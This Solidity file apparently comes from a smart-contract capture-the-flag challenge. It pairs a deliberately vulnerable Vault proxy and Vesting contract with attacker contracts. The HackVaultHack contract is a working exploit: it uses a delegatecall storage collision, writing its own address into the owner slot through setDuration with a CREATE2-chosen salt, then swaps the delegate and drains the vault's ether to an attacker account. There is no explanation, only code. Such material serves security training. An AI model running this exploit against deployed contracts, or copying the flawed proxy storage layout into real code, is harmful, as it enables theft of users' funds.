// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Vault.sol";
import "./Vesting.sol";

contract VaultHackCreator {
    function deploy(address instance, address account, uint256 salt) external {
        HackVaultHack hack = new HackVaultHack{salt: bytes32(salt)}(instance, account);
        require(uint160(address(hack)) > uint160(instance), "hack is less than instance");
        hack.hack();
    }
}

contract HackVaultHack {
    address instance;
    address account;

    constructor(address _instance, address _account) {
        instance = _instance;
        account = _account;
    }

    function hack() external {
        uint256 duration = uint256(uint160(address(this)));
        bytes memory durationData = abi.encodeWithSelector(Vesting.setDuration.selector, duration);

        // bytes memory executeDurationData = abi.encodeWithSelector(Vault.execute.selector, instance, durationData);
        // (bool success, ) = instance.call(executeDurationData);
        // require(success, "execute setDuration failed");
        Vault(payable(instance)).execute(instance, durationData);

        Vault(payable(instance)).upgradeDelegate(address(this));

        bytes memory withdrawData = abi.encodeWithSelector(HackVaultHack.withdraw.selector, account);
        Vault(payable(instance)).execute(instance, withdrawData);
    }

    function withdraw(address payable receiver) external {
        receiver.transfer(address(this).balance);
    }
}

/**
 *Submitted for verification at Etherscan.io on 2022-09-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Vault {
    address public delegate;
    address public owner;

    event Deposit(address _from, uint256 value);
    event DelegateUpdated(address oldDelegate, address newDelegate);

    constructor(address _imp) {
        owner = msg.sender;
        delegate = _imp;
    }

    modifier onlyAuth() {
        require(
            msg.sender == owner || msg.sender == address(this),
            "No permission"
        );
        _;
    }

    // Any ether sent to this contract will follow the vesting schedule defined in Vesting.sol
    receive() external payable {
        emit Deposit(msg.sender, msg.value);
    }

    fallback() external payable {
        _delegate(delegate);
    }

    function upgradeDelegate(address newDelegateAddress) external {
        require(msg.sender == owner, "Only owner");
        address oldDelegate = delegate;
        delegate = newDelegateAddress;

        emit DelegateUpdated(oldDelegate, newDelegateAddress);
    }

    function execute(address _target, bytes memory payload)
        external
        returns (bytes memory)
    {
        (bool success, bytes memory ret) = address(_target).call(payload);
        require(success, "failed");
        return ret;
    }

    function _delegate(address _imp) internal onlyAuth {
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch space at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // delegatecall the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let success := delegatecall(gas(), _imp, 0, calldatasize(), 0, 0)

            // copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch success
            // delegatecall returns 0 on error.
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

/**
 *Submitted for verification at Etherscan.io on 2022-09-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/**
 * @title Vesting v1
 * @dev This contract handles the vesting of Eth for a given beneficiary.
 * The vesting schedule is customizable through the {setDuration} function.
 */
contract Vesting {
    event EtherReleased(uint256 amount);

    address public beneficiary;

    uint256 public duration;
    uint256 public start;
    uint256 public released;

    /**
     * @dev Set the start timestamp of the vesting wallet.
     */
    function setStart(uint256 startTimestamp) public {
        require(start == 0, "already set");
        start = startTimestamp;
    }

    /**
     * @dev Set the vesting duration of the vesting wallet.
     */
    function setDuration(uint256 durationSeconds) public {
        require(
            durationSeconds > duration,
            "You cant decrease the vesting time!"
        );

        duration = durationSeconds;
    }

    /**
     * @dev Release the native token (ether) that have already vested.
     *
     * Emits a {EtherReleased} event.
     */
    function release() public virtual {
        uint256 releasable = vestedAmount(block.timestamp) - released;
        released += releasable;
        emit EtherReleased(releasable);
        (bool success, ) = payable(beneficiary).call{value: releasable}("");
        require(success, "tx failed");
    }

    /**
     * @dev Calculates the amount of ether that has already vested. Default implementation is a linear vesting curve.
     */
    function vestedAmount(uint256 timestamp)
        public
        view
        virtual
        returns (uint256)
    {
        return _vestingSchedule(address(this).balance + released, timestamp);
    }

    /**
     * @dev Virtual implementation of the vesting formula. This returns the amount vested, as a function of time, for
     * an asset given its total historical allocation.
     */
    function _vestingSchedule(uint256 totalAllocation, uint256 timestamp)
        internal
        view
        virtual
        returns (uint256)
    {
        if (timestamp < start) {
            return 0;
        } else if (timestamp > start + duration) {
            return totalAllocation;
        } else {
            return (totalAllocation * (timestamp - start)) / duration;
        }
    }
}